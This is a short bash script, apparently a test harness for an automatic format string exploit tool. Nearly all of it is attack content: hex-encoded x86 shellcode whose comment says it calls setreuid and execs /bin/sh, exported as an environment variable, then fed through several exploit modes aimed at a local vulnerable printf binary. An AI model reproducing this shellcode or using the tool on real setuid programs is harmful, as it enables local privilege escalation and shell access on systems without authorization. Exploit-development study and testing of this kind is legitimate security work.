#!/bin/bash
# Test suite for different exploit methods of the automatic format string tool

# Shellcode for: setreuid(geteuid(),geteuid());execve("/bin/sh",0,0);
TEST=`echo -ne "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"`

export TEST
RUN='python ./format_exploit_automagic.py'

echo "Attempting various format string exploit methods using: $RUN"
$RUN ./printf
$RUN ./printf -S $TEST
$RUN -E ./printf
$RUN -e TEST ./printf
$RUN -b `echo -ne "\x6a\x31\x58\x99"` ./printf
$RUN -c ./printf

